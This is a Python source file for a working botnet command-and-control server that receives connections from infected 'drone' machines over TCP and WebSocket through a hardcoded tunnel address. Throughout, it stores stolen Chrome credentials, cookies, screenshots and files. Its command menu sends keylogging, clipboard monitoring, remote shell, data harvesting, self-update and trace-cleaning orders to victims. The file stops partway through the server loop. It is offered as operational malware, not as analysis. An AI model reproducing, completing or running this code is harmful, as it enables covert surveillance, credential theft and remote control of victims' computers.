import argparse
import asyncio
import base64
import json
import os
import platform
import re
import shlex
import shutil
import socket
import subprocess
import threading
import time
from typing import Dict, Optional, Tuple

# ============================================================
# MANUAL LOCALTONET TUNNEL CONFIGURATION
# ============================================================
PUBLIC_URL = "ufazduoqpe.localto.net:7229"

try:
    import websockets
    WEBSOCKETS_AVAILABLE = True
except ImportError:
    websockets = None
    WEBSOCKETS_AVAILABLE = False

try:
    import tkinter as tk
    from PIL import Image, ImageTk
    TKINTER_AVAILABLE = True
except ImportError:
    tk = None
    TKINTER_AVAILABLE = False

try:
    from tqdm import tqdm
    TQDM_AVAILABLE = True
except ImportError:
    tqdm = None
    TQDM_AVAILABLE = False

BUFFER_SIZE = 8192

def handle_binary_transfer(client_socket, initial_buffer, exfil_dir):
    """Receives and saves incoming binary files using the structured transfer protocol."""
    import struct
    try:
        # Receive header: 4 bytes filesize BE + 1 byte filename length
        if len(initial_buffer) < 5:
            needed = 5 - len(initial_buffer)
            chunk = client_socket.recv(needed)
            initial_buffer += chunk
        
        filesize, name_len = struct.unpack(">I B", initial_buffer[:5])
        remaining_buffer = initial_buffer[5:]
        
        # Read filename
        while len(remaining_buffer) < name_len:
            chunk = client_socket.recv(min(name_len - len(remaining_buffer), 8192))
            if not chunk:
                return None
            remaining_buffer += chunk
        
        filename = remaining_buffer[:name_len].decode('utf-8', errors='ignore')
        remaining_buffer = remaining_buffer[name_len:]
        
        print(f"[*] Downloading {filename} ({filesize} bytes)...")
        
        save_path = os.path.join(exfil_dir, filename)
        
        with open(save_path, "wb") as f:
            # Write any remaining bytes we already have
            if remaining_buffer:
                f.write(remaining_buffer)
            
            remaining = filesize - len(remaining_buffer)
            while remaining > 0:
                chunk = client_socket.recv(min(remaining, 8192))
                if not chunk:
                    break
                f.write(chunk)
                remaining -= len(chunk)
        
        print(f"[+] {filename} saved successfully to {save_path}")
        return save_path
    
    except Exception as e:
        print(f"[!] Binary transfer failed: {e}")
        return None

class NodeNamingManager:
    """Manages persistent mapping between HWIDs and node aliases."""
    
    def __init__(self, registry_file: str = 'nodes_registry.json'):
        self.registry_file = registry_file
        self.hwid_to_alias = {}
        self.alias_to_hwid = {}
        self.next_node_number = 1
        self._load_registry()
    
    def _load_registry(self):
        """Load the persistent registry from JSON file."""
        if os.path.exists(self.registry_file):
            try:
                with open(self.registry_file, 'r') as f:
                    data = json.load(f)
                    self.hwid_to_alias = data.get('hwid_to_alias', {})
                    self.alias_to_hwid = data.get('alias_to_hwid', {})
                    self.next_node_number = data.get('next_node_number', 1)
                    
                    # Validate and rebuild mappings if needed
                    self._rebuild_mappings()
            except (json.JSONDecodeError, KeyError) as e:
                print(f"[!] Error loading registry: {e}, starting fresh")
                self._initialize_empty_registry()
        else:
            self._initialize_empty_registry()
    
    def _initialize_empty_registry(self):
        """Initialize an empty registry."""
        self.hwid_to_alias = {}
        self.alias_to_hwid = {}
        self.next_node_number = 1
    
    def _rebuild_mappings(self):
        """Rebuild bidirectional mappings and find next node number."""
        # Clear and rebuild from hwid_to_alias
        self.alias_to_hwid = {alias: hwid for hwid, alias in self.hwid_to_alias.items()}
        
        # Find the highest node number
        used_numbers = set()
        for alias in self.alias_to_hwid.keys():
            if alias.startswith('node-'):
                try:
                    num = int(alias[5:])
                    used_numbers.add(num)
                except ValueError:
                    continue
        
        if used_numbers:
            self.next_node_number = max(used_numbers) + 1
        else:
            self.next_node_number = 1
    
    def _save_registry(self):
        """Save the registry to JSON file."""
        data = {
            'hwid_to_alias': self.hwid_to_alias,
            'alias_to_hwid': self.alias_to_hwid,
            'next_node_number': self.next_node_number
        }
        try:
            with open(self.registry_file, 'w') as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            print(f"[!] Error saving registry: {e}")
    
    def get_or_assign_alias(self, hwid: str) -> str:
        """Get existing alias for HWID or assign a new one."""
        if hwid in self.hwid_to_alias:
            return self.hwid_to_alias[hwid]
        
        # Assign new alias
        alias = f'node-{self.next_node_number:03d}'
        self.next_node_number += 1
        
        # Update mappings
        self.hwid_to_alias[hwid] = alias
        self.alias_to_hwid[alias] = hwid
        
        # Save to disk
        self._save_registry()
        
        return alias
    
    def get_hwid_by_alias(self, alias: str) -> Optional[str]:
        """Get HWID for a given alias."""
        return self.alias_to_hwid.get(alias)
    
    def get_alias_by_hwid(self, hwid: str) -> Optional[str]:
        """Get alias for a given HWID."""
        return self.hwid_to_alias.get(hwid)
    
    def remove_alias(self, alias: str):
        """Remove an alias (when node disconnects, but keep it reserved)."""
        # Note: We keep the mapping persistent even on disconnect
        # as per requirements: "keep the node-001 name reserved for that specific HWID"
        pass

class CommandHub:
    def __init__(self, host: str = '0.0.0.0', port: int = 9999):
        self.host = host
        self.port = port
        self.server = None
        self.tcp_server_socket = None

        # Initialize node naming manager for persistent HWID to alias mapping
        self.naming_manager = NodeNamingManager()
        
        self.nodes: Dict[str, object] = {}  # client_id -> connection
        self.node_id_map: Dict[str, str] = {}  # client_id -> alias
        self.id_to_ws: Dict[str, object] = {}  # alias -> connection
        self.node_status: Dict[str, dict] = {}  # alias -> status
        self.pending_hwid: Dict[str, bool] = {}  # client_id -> waiting_for_hwid
        self.active_nodes: Dict[str, dict] = {}  # alias -> {hwid, user, location, version, connected_at}
        self.lock = threading.Lock()
        self.output_lock = threading.Lock()
        self.command_queue = []
        self.active_node = None
        self.running = True

        self.monitor_thread = None
        self.monitored_node = None

        # Create exfiltrated_files directory if it doesn't exist
        self.exfil_dir = os.path.join(os.path.dirname(__file__), 'exfiltrated_files')
        os.makedirs(self.exfil_dir, exist_ok=True)

        # Heartbeat thread for keep-alive (20-second pings)
        self.heartbeat_thread = None
        self.last_heartbeat = {}

        print(f"[\033[92m+\033[0m] Command Hub Active on {host}:{port} (TCP)")

    async def handle_websocket(self, websocket):
        """Handle incoming WebSocket connections from drones."""
        print("[DEBUG] handle_websocket called")
        client_id = str(id(websocket))  # Use websocket object id as client identifier
        
        with self.lock:
            self.nodes[client_id] = websocket
            # Temporary ID until HWID is received
            temp_id = f"temp-{client_id}"
            self.node_id_map[client_id] = temp_id
            self.id_to_ws[temp_id] = websocket
            self.pending_hwid[client_id] = True
        
        print(f"[+] Node Connected: {client_id} (waiting for HWID)")
        
        # Send initial status request to get HWID
        self.send_command(client_id, "STATUS_REPORT")
        
        # Open exfiltrated_files folder if this is the first node
        if len(self.nodes) == 1:
            try:
                import subprocess
                subprocess.run(['explorer.exe', self.exfil_dir], check=False)
                print("[*] Opened exfiltrated_files folder in Explorer")
            except Exception as e:
                print(f"[!] Failed to open Explorer: {e}")

        try:
            await self.handle_node(websocket, client_id)
        finally:
            self.remove_node(client_id)

    def handle_tcp_client(self, client: socket.socket, addr):
        """Handle incoming raw TCP connections from drones - Buffered Stream Reader."""
        client_id = str(id(client))
        node_id = None
        session_hwid = None
        alias = None
        user = None
        location = None
        version = None
        
        print(f"[*] New connection from {addr}")
        try:
            # Buffered Stream Reader: Collect data until END_HANDSHAKE
            received_data = ""
            
            # Set socket timeout for recv operations
            client.settimeout(1.0)
            
            while "END_HANDSHAKE" not in received_data:
                try:
                    chunk = client.recv(1024).decode('utf-8', errors='ignore')
                    if chunk:
                        received_data += chunk
                    else:
                        # Connection closed
                        print(f"[!] Connection closed before handshake from {addr}")
                        client.close()
                        return
                except socket.timeout:
                    # No data available within timeout
                    pass
                
                # If we have at least 50 characters and still no END_HANDSHAKE, it's invalid
                if len(received_data) >= 50 and "END_HANDSHAKE" not in received_data:
                    print(f"[!] Invalid handshake from {addr} - received 50+ chars without END_HANDSHAKE")
                    client.close()
                    return
                
                time.sleep(0.05)
            
            # Parse the NODE_DATA|HWID|Username|Location|Version format
            handshake = received_data.split("END_HANDSHAKE")[0].strip()
            print(f"[\033[94m*\033[0m] Handshake received: '{handshake}'")
            
            if handshake.startswith("NODE_DATA|"):
                parts = handshake.rstrip('|').split('|')
                if len(parts) == 5:
                    _, session_hwid, user, location, version = parts
                    session_hwid = session_hwid.strip()
                    user = user.strip()
                    location = location.strip()
                    version = version.strip()
                else:
                    print(f"[!] Invalid handshake format from {addr} - expected 5 parts, got {len(parts)}")
                    client.close()
                    return
            else:
                print(f"[!] Unexpected handshake format from {addr}")
                client.close()
                return
            
            # Register the node
            client.setblocking(True)  # Switch back to blocking
            client.settimeout(1.0)
            
            with self.lock:
                self.nodes[client_id] = client
                # Get or assign persistent alias for this HWID
                alias = self.naming_manager.get_or_assign_alias(session_hwid)
                self.node_id_map[client_id] = alias
                self.id_to_ws[alias] = client
                # immediately add to active_nodes
                self.active_nodes[alias] = {
                    'hwid': session_hwid,
                    'user': user,
                    'location': location,
                    'version': version,
                    'connected_at': time.time(),
                    'addr': addr
                }
                last_heartbeat = time.time()
            
            print(f"[\033[92m+\033[0m] Node {alias} connected with HWID {session_hwid}")
            print(f"[\033[92m+\033[0m] User: {user}")
            print(f"[\033[92m+\033[0m] Location: {location}")
            print(f"[\033[92m+\033[0m] Version: {version}")
            
            # Send KING_ACK to stop the drone from shouting
            try:
                client.send(b"KING_ACK\n")
            except Exception as e:
                print(f"[!] Failed to send KING_ACK to {alias}: {e}")
            
            print(f"[\033[94m*\033[0m] Requesting STATUS_REPORT from {alias}")
            self.send_command(client_id, "STATUS_REPORT")

            buffer = b''

            while self.running:
                try:
                    chunk = client.recv(4096)
                    if not chunk:
                        break
                    buffer += chunk

                    while True:
                        # Check for new binary transfer protocol
                        transfer_start = buffer.find(b"TRANSFER_START")
                        if transfer_start != -1:
                            # Handle structured binary file transfer
                            initial_data = buffer[transfer_start + len(b"TRANSFER_START"):]
                            handle_binary_transfer(client, initial_data, self.exfil_dir)
                            # Clear buffer after transfer
                            buffer = b''
                            continue

                        header_start = buffer.find(b"DATA_HEADER|")
                        if header_start != -1:
                            newline_index = buffer.find(b"\n", header_start)
                            if newline_index == -1:
                                break

                            header_line = buffer[header_start:newline_index].decode('utf-8', errors='ignore')
                            parts = header_line.split("|")
                            if len(parts) < 3:
                                buffer = buffer[newline_index + 1:]
                                continue

                            data_type = parts[1]
                            try:
                                data_size = int(parts[2])
                            except ValueError:
                                buffer = buffer[newline_index + 1:]
                                continue
                            filename = parts[3] if len(parts) > 3 else "exfil.bin"
                            payload_start = newline_index + 1
                            footer = b"V_PULSE_EOF"
                            total_length = payload_start + data_size + len(footer)

                            if len(buffer) < total_length:
                                break

                            payload = buffer[payload_start:payload_start + data_size]
                            footer_data = buffer[payload_start + data_size:total_length]
                            if footer_data == footer:
                                self._process_data(alias, data_type, filename, payload)
                                buffer = buffer[total_length:]
                                continue
                            buffer = buffer[newline_index + 1:]
                            continue

                        if b"\n" in buffer:
                            line, buffer = buffer.split(b"\n", 1)
                            msg = line.decode('utf-8', errors='ignore').strip()
                            if msg:
                                if msg.startswith('STATUS:'):
                                    self._handle_status_report(msg[7:], client_id)
                                elif msg == 'PING':
                                    last_heartbeat = time.time()
                                else:
                                    # catch the JSON cookies and save them properly
                                    if "COOKIE_JSON|" in msg:
                                        _, json_data = msg.split("|", 1)
                                        with open("harvested_cookies.json", "w") as f:
                                            f.write(json_data)
                                        print("[+] JSON Cookies Captured and Saved.")
                                    # catch and reconstruct the photo/pdf
                                    elif "FILE_STREAM|" in msg:
                                        _, filename, encoded_data = msg.split("|", 2)
                                        with open(f"STOLEN_{filename}", "wb") as f:
                                            f.write(base64.b64decode(encoded_data))
                                        print(f"[+] File {filename} successfully exfiltrated.")
                                    else:
                                        with self.output_lock:
                                            print(f"\n[?] Message from {alias}: {msg}")
                                            print("hub> ", end="", flush=True)
                            continue

                        # If the buffer grows too large without a newline, print and reset it.
                        if len(buffer) > 16384:
                            try:
                                msg = buffer.decode('utf-8', errors='ignore').strip()
                                if msg:
                                    with self.output_lock:
                                        print(f"\n[?] Message from {node_id}: {msg}")
                                        print("hub> ", end="", flush=True)
                            except Exception:
                                pass
                            buffer = b''
                        break
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"[!] TCP client error: {e}")
                    break
                
                # Check heartbeat timeout
                if time.time() - last_heartbeat > 60:
                    print(f"[!] Heartbeat timeout for {alias} - disconnecting")
                    break
        except Exception as e:
            print(f"[!] Unexpected error in handle_tcp_client from {addr}: {e}")
        finally:
            self.remove_node(client_id)
    def _recv_exact(self, conn: socket.socket, initial_data: bytes, size: int, timeout: float = 30.0) -> Tuple[Optional[bytes], bytes]:
        """High-precision binary receiver with magic footer validation."""
        data = initial_data
        start_time = time.time()
        footer = b"V_PULSE_EOF"
        total_expected = size + len(footer)
        
        conn.settimeout(1.0)
        while len(data) < total_expected:
            if time.time() - start_time > timeout:
                return None, b''
            try:
                # Read in optimized chunks
                chunk = conn.recv(min(8192, total_expected - len(data)))
                if not chunk: break
                data += chunk
            except (socket.timeout, BlockingIOError):
                continue
            except Exception:
                break
        
        # Validate the transfer integrity using the footer
        if len(data) >= total_expected and data[size:size+len(footer)] == footer:
            return data[:size], data[total_expected:]
        return None, b''

    async def handle_node(self, websocket, client_id: str) -> None:
        """Handle WebSocket communication with a drone."""
        print(f"[DEBUG] handle_node called for {client_id}")
        node_id = self.node_id_map.get(client_id, "unknown")
        
        try:
            async for message in websocket:
                print(f"[DEBUG] Hub received from {node_id}: {repr(message)}")
                if isinstance(message, bytes):
                    if message.startswith(b"DATA_HEADER|"):
                        await self._handle_binary_message(websocket, message, node_id)
                        continue
                    try:
                        msg = message.decode('utf-8', errors='ignore')
                    except Exception:
                        await self._handle_binary_message(websocket, message, node_id)
                        continue
                else:
                    msg = message

                # --- New Protocol Parsers ---
                if msg.startswith("STATUS:"):
                    self._handle_status_report(msg[7:], client_id)
                elif msg == "PING_OK":
                    continue
                # catch the JSON cookies and save them properly
                elif "COOKIE_JSON|" in msg:
                    _, json_data = msg.split("|", 1)
                    with open("harvested_cookies.json", "w") as f:
                        f.write(json_data)
                    print("[+] JSON Cookies Captured and Saved.")
                # catch and reconstruct the photo/pdf
                elif "FILE_STREAM|" in msg:
                    _, filename, encoded_data = msg.split("|", 2)
                    with open(f"STOLEN_{filename}", "wb") as f:
                        f.write(base64.b64decode(encoded_data))
                    print(f"[+] File {filename} successfully exfiltrated.")
                # To catch the JSON cookies
                elif "COOKIES_DATA" in msg:
                    _, size, content = msg.split("|", 2)
                    with open(f"cookies_{node_id}.json", "w") as f:
                        f.write(content)
                    print(f"[+] Saved {size} bytes to cookies_{node_id}.json")
                
                # To catch binary files (.jpg / .pdf)
                elif "FILE_DATA" in msg:
                    _, filename, filedata = msg.split("|", 2)
                    with open(f"DOWNLOADED_{filename}", "wb") as f:
                        f.write(base64.b64decode(filedata))
                    print(f"[+] File {filename} received and saved.")
                
                else:
                    with self.output_lock:
                        print(f"\n[?] Message from {node_id}: {msg}")
                        print("hub> ", end="", flush=True)
        except websockets.exceptions.ConnectionClosed:
            pass
        except Exception as e:
            with self.output_lock:
                print(f"\n[!] Error handling node {node_id}: {e}")
                import traceback
                traceback.print_exc()
                    
        except websockets.exceptions.ConnectionClosed:
            pass
        except Exception as e:
            with self.output_lock:
                print(f"\n[!] Error handling node {node_id}: {e}")
                import traceback
                traceback.print_exc()

    async def _handle_binary_message(self, websocket, data: bytes, node_id: str) -> None:
        """Handle binary data from DATA_HEADER protocol."""
        # Check for Binary Header
        if b"DATA_HEADER|" in data:
            h_start = data.find(b"DATA_HEADER|")
            h_end = data.find(b"\n", h_start)
            
            if h_end != -1:
                header_line = data[h_start:h_end].decode('utf-8', errors='ignore')
                parts = header_line.split("|")
                
                if len(parts) >= 3:
                    d_type = parts[1]
                    d_size = int(parts[2])
                    d_name = parts[3] if len(parts) > 3 else "exfil.bin"
                    
                    # Get the payload data
                    payload_start = h_end + 1
                    if payload_start + d_size <= len(data):
                        payload = data[payload_start:payload_start + d_size]
                        self._process_data(node_id, d_type, d_name, payload)
                        return
                    
        # Legacy support for older drones
        if data.startswith(b"CRED_SIZE"):
            try:
                size_str = data.decode('utf-8', errors='ignore')
                size = int(size_str.split()[1])
                # For legacy, assume the rest is payload
                payload = data[len(b"CRED_SIZE") + len(str(size)) + 2:]  # +2 for space and newline
                if len(payload) >= size:
                    self._process_data(node_id, "CREDENTIALS", "creds.txt", payload[:size])
            except:
                pass

    def _process_data(self, node_id: str, data_type: str, filename: str, payload: bytes) -> None:
        """Process received binary data from DATA_HEADER protocol."""
        print(f"[DEBUG] Processing {data_type} from {node_id}, size {len(payload)}")
        if data_type.upper() == "CREDENTIALS":
            save_path = os.path.join(self.exfil_dir, filename)
            with open(save_path, 'w', encoding='utf-8') as f:
                f.write(payload.decode('utf-8', errors='replace'))
        elif data_type.upper() == "SCREENSHOT":
            screenshot_dir = os.path.join(self.exfil_dir, 'screenshots')
            os.makedirs(screenshot_dir, exist_ok=True)
            save_path = os.path.join(screenshot_dir, filename)
            with open(save_path, 'wb') as f:
                f.write(payload)
            try:
                os.startfile(save_path)
            except Exception:
                pass
        else:
            save_path = os.path.join(self.exfil_dir, filename)
            with open(save_path, 'wb') as f:
                f.write(payload)
        
        with self.output_lock:
            print(f"[*] {data_type} data saved to {filename} from {node_id}")

    def remove_node(self, client_id: str) -> None:
        with self.lock:
            conn = self.nodes.pop(client_id, None)
            node_id = self.node_id_map.pop(client_id, None)
            if node_id:
                self.id_to_ws.pop(node_id, None)
                self.node_status.pop(node_id, None)
                self.active_nodes.pop(node_id, None)

        if conn:
            try:
                if isinstance(conn, socket.socket):
                    conn.close()
            except Exception:
                pass

        if node_id:
            print(f"[-] Node disconnected: {client_id} ({node_id})")
        else:
            print(f"[-] Node disconnected: {client_id}")

    def monitor_node(self, node_id):
        while self.monitored_node == node_id and self.running:
            addr, conn = self.resolve_node(node_id)
            if not addr or not conn:
                print(f"[!] Monitored node {node_id} disconnected")
                break
            try:
                conn.sendall(b'DESKTOP_CAPTURE\n')
            except (socket.error, ConnectionResetError, BrokenPipeError):
                print(f"[!] Failed to send to monitored node {node_id}")
                break
            time.sleep(5)
        print(f"[*] Stopped monitoring {node_id}")

    def start_live_view(self):
        if TKINTER_AVAILABLE:
            live_view_path = os.path.join(self.exfil_dir, 'live_view.png')
            window = LiveViewWindow(live_view_path)
            threading.Thread(target=window.run, daemon=True).start()
            print("[*] Live view window started")

    def resolve_node(self, identifier: str) -> Tuple[Optional[str], Optional[object]]:
        with self.lock:
            if identifier in self.nodes:
                # Direct client_id lookup
                return identifier, self.nodes.get(identifier)
            elif identifier in self.id_to_ws:
                # Node ID lookup
                return identifier, self.id_to_ws.get(identifier)
            else:
                return None, None

    def broadcast_command(self, cmd: str) -> None:
        with self.lock:
            nodes = list(self.nodes.items())

        print(f"[*] Sending '{cmd}' to {len(nodes)} node(s)...")
        for client_id, conn in nodes:
            try:
                self._send_message(conn, cmd)
            except Exception:
                print(f"[!] Node {client_id} failed, removing")
                self.remove_node(client_id)

    def send_command(self, addr_text: str, cmd: str) -> None:
        client_id, conn = self.resolve_node(addr_text)
        if not client_id or not conn:
            print(f"[!] No connected node found for '{addr_text}'")
            return

        try:
            self._send_message(conn, cmd)
            node_id = self.node_id_map.get(client_id, client_id)
            print(f"[*] Sent '{cmd}' to {node_id} ({client_id})")
        except Exception:
            print(f"[!] Failed to send to {client_id}, removing")
            self.remove_node(client_id)

    def _send_message(self, conn, message: str) -> None:
        """Send a message over either a raw socket or a WebSocket."""
        if isinstance(conn, socket.socket):
            conn.sendall(message.encode('utf-8'))
            return
        try:
            asyncio.create_task(self._send_websocket_message(conn, message))
        except Exception as e:
            print(f"[!] Send failed: {e}")

    async def _send_websocket_message(self, websocket, message: str) -> None:
        """Send a message via WebSocket."""
        try:
            await websocket.send(message)
        except Exception as e:
            print(f"[!] WebSocket send failed: {e}")

    def show_aggregated_status(self) -> None:
        print("\n=== Aggregated Node Status ===")
        with self.lock:
            if not self.node_status:
                print("No status reports received yet.")
                return

            headers = ['Node', 'HWID', 'User', 'Machine', 'Location', 'ISP', 'CPU', 'RAM', 'Window']
            rows = []
            for node_id, status in sorted(self.node_status.items()):
                hwid = status.get('HWID', 'unknown')
                user_name = status.get('SystemUsername', status.get('User', status.get('Username', 'unknown')))
                machine = status.get('MachineName', status.get('Hostname', 'unknown'))
                city = status.get('City', '')
                country = status.get('Country', '')
                isp = status.get('ISP', 'Obscured')
                location = ', '.join(part for part in (city, country) if part) or status.get('Location', 'Obscured')
                cpu = status.get('CPU', 'N/A')
                ram = status.get('RAMAvailable', status.get('Memory', 'N/A'))
                window = status.get('WindowTitle', 'N/A')
                rows.append([node_id, hwid, user_name, machine, location, isp, cpu, ram, window])

        widths = [max(len(str(row[i])) for row in rows + [headers]) for i in range(len(headers))]
        separator = '+' + '+'.join('-' * (w + 2) for w in widths) + '+'
        header_row = '| ' + ' | '.join(headers[i].center(widths[i]) for i in range(len(headers))) + ' |'

        print(separator)
        print(header_row)
        print(separator)
        for row in rows:
            values = []
            for i, value in enumerate(row):
                text = str(value)
                if len(text) > widths[i]:
                    text = text[:widths[i] - 3] + '...'
                values.append(text.ljust(widths[i]))
            print('| ' + ' | '.join(values) + ' |')
        print(separator)
        print(f"Total nodes with status: {len(rows)}")

    def list_nodes(self) -> None:
        with self.lock:
            if not self.active_nodes and not self.nodes:
                print("No connected nodes.")
                return
            print("\n=== Connected Nodes (Active) ===")
            if self.active_nodes:
                for alias in sorted(self.active_nodes):
                    node_info = self.active_nodes[alias]
                    hwid = node_info.get('hwid', 'N/A')
                    user = node_info.get('user', 'Unknown')
                    location = node_info.get('location', 'Unknown')
                    print(f"[{alias}] | User: {user} | Loc: {location} | HWID: {hwid} | STATUS: ONLINE")
                print(f"\nTotal active nodes: {len(self.active_nodes)}")
            else:
                print("No active nodes found.")
            
            # Also show node status if available
            if self.node_status:
                print("\n=== Node Status Reports ===")
                for alias in sorted(self.node_status):
                    status = self.node_status[alias]
                    os_info = status.get('OS', 'Unknown')
                    hostname = status.get('Hostname', 'Unknown')
                    window_title = status.get('WindowTitle', '[No Active Window]')
                    print(f"[{alias}] OS: {os_info} | Hostname: {hostname} | Window: {window_title}")

    def shutdown(self) -> None:
        self.running = False
        try:
            if self.tcp_server_socket:
                self.tcp_server_socket.close()
        except Exception:
            pass
        with self.lock:
            nodes = list(self.nodes.items())
        for client_id, conn in nodes:
            try:
                if isinstance(conn, socket.socket):
                    conn.close()
                else:
                    asyncio.create_task(conn.close())
            except Exception:
                pass
        print("[*] Command Hub shutdown complete.")

    def cli_loop(self) -> None:
        import logging
        logging.basicConfig(filename='history.log', level=logging.INFO, format='%(asctime)s - %(message)s')
        help_text = (
            "Commands:\n"
            "  help                    Show this message\n"
            "  list                    List connected nodes\n"
            "  status                  Show aggregated status reports\n"
            "  broadcast STATUS_REPORT Ask all nodes for a status update\n"
            "  broadcast SHUTDOWN_NODE Tell all nodes to disconnect\n"
            "  broadcast PING         Send a ping to all nodes\n"
            "  handshake              Send PING and STATUS_REPORT to confirm connected nodes\n"
            "  test                    Send STATUS_REPORT to all nodes and show aggregated status\n"
            "  broadcast EXPLORE_DRIVES Ask all nodes to explore drives\n"
            "  broadcast HARVEST_USER   Ask all nodes to harvest user data\n"
            "  broadcast NETWORK_TOPOLOGY Report local ARP table from all nodes\n"
            "  broadcast EXTRACT_CREDENTIALS Extract Chrome passwords from all nodes\n"
            "  extract                Shortcut to broadcast EXTRACT_CREDENTIALS to all nodes\n"
            "  type <text>            Shortcut to broadcast GHOST_TYPE|<text> to all nodes\n"
            "  shake                 Shortcut to broadcast GHOST_MOVE to all nodes\n"
            "  open <url>             Shortcut to broadcast GHOST_OPEN|<url> to all nodes\n"
            "    Example: type Hello Judges\n"
            "    Example: open https://example.com\n"
            "  broadcast MESSAGE \"text\" Display popup on all nodes\n"
            "  broadcast SHELL \"cmd\"   Run shell command on all nodes\n"
            "  broadcast KILL_AGENT    Terminate all agents and clean traces\n"
            "  evolve --all            Force every connected node to check for updates\n"
            "  evolve <node-id>        Force a specific node to check for updates\n"
            "  github-throne           Update GitHub throne file with current public IP\n"
            "  throne-update           Alias for github-throne\n"
            "  monitor <node-id>       Start monitoring node with live screenshots\n"
            "  <node-id> <COMMAND>     Send command to specific node (e.g., node-001 EXPLORE_DRIVES)\n"
            "  <node-id> MESSAGE \"text\" Display popup on specific node\n"
            "  <node-id> SHELL \"cmd\"   Run shell command on specific node\n"
            "  <node-id> KEYLOG START|STOP Start/stop keylogger on node\n"
            "  <node-id> GET_KEYS      Download keylog from node\n"
            "  <node-id> CLIPBOARD START|STOP Start/stop clipboard monitor on node\n"
            "  <node-id> KILL_AGENT    Terminate specific agent and clean traces\n"
            "  send <node-id|host:port> <COMMAND> Send a command to a single node (legacy)\n"
            "  quit                    Stop the hub\n"
        )
        print(help_text)

        while self.running:
            try:
                line = input('hub> ').strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break

            if not line:
                continue

            logging.info(f"Command executed: {line}")
            parts = line.split()
            command = parts[0].lower()

            if command in {'help', 'h', '?'}:
                print(help_text)
            elif command in {'list', 'nodes'}:
                self.list_nodes()
            elif command in {'status', 'show'}:
                self.show_aggregated_status()
            elif command == 'broadcast':
                if len(parts) < 2:
                    print("[!] broadcast requires a command argument")
                    continue
                self.broadcast_command(' '.join(parts[1:]))
            elif command == 'test':
                self.broadcast_command('STATUS_REPORT')
                time.sleep(1)
                self.show_aggregated_status()
            elif command == 'handshake':
                self.broadcast_command('PING')
                self.broadcast_command('STATUS_REPORT')
                time.sleep(1)
                self.show_aggregated_status()
            elif command == 'extract':
                self.broadcast_command('EXTRACT_CREDENTIALS')
            elif command == 'evolve':
                if len(parts) > 1 and parts[1] == '--all':
                    self.broadcast_command('TRIGGER_EVOLVE')
                elif len(parts) > 1:
                    self.send_command(parts[1], 'TRIGGER_EVOLVE')
                else:
                    print('[!] Usage: evolve --all or evolve <node-id>')
            elif command in {'github-throne', 'throne-update'}:
                if update_github_throne():
                    print("[*] GitHub throne updated successfully")
                else:
                    print("[!] GitHub throne update failed")
            elif command == 'type':
                if len(parts) < 2:
                    print("[!] TYPE requires a message")
                    continue
                message_text = line[5:].strip()
                self.broadcast_command(f'GHOST_TYPE|{message_text}')
            elif command == 'shake':
                self.broadcast_command('GHOST_MOVE')
            elif command == 'open':
                if len(parts) < 2:
                    print("[!] OPEN requires a URL")
                    continue
                url = line[5:].strip()
                self.broadcast_command(f'GHOST_OPEN|{url}')
            elif command == 'send':
                if len(parts) < 3:
                    print("[!] send requires node id or address and command")
                    continue
                self.send_command(parts[1], ' '.join(parts[2:]))
            elif command == 'monitor':
                if len(parts) < 2:
                    print("[!] monitor requires a node id argument")
                    continue
                node_id = parts[1]
                client_id, websocket = self.resolve_node(node_id)
                if not client_id or not websocket:
                    print(f"[!] No connected node found for '{node_id}'")
                    continue
                if self.monitor_thread and self.monitor_thread.is_alive():
                    print("[!] Monitor already running, stopping first")
                    self.monitored_node = None
                    self.monitor_thread.join(timeout=1.0)
                self.monitored_node = node_id
                self.monitor_thread = threading.Thread(target=self.monitor_node, args=(node_id,), daemon=True)
                self.monitor_thread.start()
                self.start_live_view()
                print(f"[*] Started monitoring {node_id}")
            elif command.startswith('node-') and command[5:].isdigit():
                # Targeted node command: node-001 EXPLORE_DRIVES
                if len(parts) < 2:
                    print("[!] Targeted command requires a command argument")
                    continue

                node_id = command
                node_cmd = ' '.join(parts[1:])
                client_id, websocket = self.resolve_node(node_id)

                if not client_id or not websocket:
                    print(f"[!] Error: Node not found")
                    continue

                try:
                    self._send_message(websocket, node_cmd)
                    print(f"[*] Sent '{node_cmd}' to {node_id} ({client_id})")
                except Exception:
                    print(f"[!] Failed to send to {client_id}, removing")
                    self.remove_node(client_id)
            elif command in {'quit', 'exit'}:
                break
            else:
                print(f"[!] Unknown command: {command}")

        self.shutdown()

    def _handle_status_report(self, status_json: str, client_id: str) -> None:
        try:
            status = json.loads(status_json)
            hwid = status.get('HWID', 'unknown')
            
            if hwid == 'unknown':
                with self.output_lock:
                    print(f"[\033[91m!\033[0m] STATUS_REPORT received without valid HWID from {client_id}")
                return
            
            with self.lock:
                # Get or assign persistent alias for this HWID
                alias = self.naming_manager.get_or_assign_alias(hwid)
                
                # Check if this client was pending HWID assignment
                was_pending = self.pending_hwid.get(client_id, False)
                
                # Update mappings
                old_id = self.node_id_map.get(client_id, f"temp-{client_id}")
                self.node_id_map[client_id] = alias
                self.id_to_ws[alias] = self.id_to_ws.pop(old_id, None)
                self.node_status[alias] = status
                
                # Remove from pending if it was pending
                self.pending_hwid.pop(client_id, None)
                
                # Clean up old temporary mappings
                if old_id != alias and old_id in self.id_to_ws:
                    del self.id_to_ws[old_id]
                if old_id != alias and old_id in self.node_status:
                    del self.node_status[old_id]
            
            with self.output_lock:
                if was_pending:
                    print(f"[\033[92m+\033[0m] Node {alias} connected with HWID {hwid}")
                    print(f"[\033[92m+\033[0m] STATUS_REPORT received: OS={status.get('OS', 'N/A')}, User={status.get('User', 'N/A')}")
                else:
                    print(f"[\033[92m+\033[0m] STATUS_REPORT updated for {alias}: CPU={status.get('CPU', 'N/A')}, Memory={status.get('Memory', 'N/A')}")
                    
        except json.JSONDecodeError as e:
            with self.output_lock:
                print(f"[\033[91m!\033[0m] Failed to parse STATUS_REPORT: {e}")

    def _run_server(self) -> None:
        print("[\033[96m*\033[0m] Starting TCP server")
        self.tcp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.tcp_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.tcp_server_socket.bind((self.host, self.port))
        self.tcp_server_socket.listen(5)
        print(f"[\033[96m*\033[0m] TCP server listening on {self.host}:{self.port}")

        while self.running:
            try:
                client, addr = self.tcp_server_socket.accept()
                # Set TCP socket timeout to 20 seconds (for high latency tunnel)
                client.settimeout(20)
                threading.Thread(target=self.handle_tcp_client, args=(client, addr), daemon=True).start()
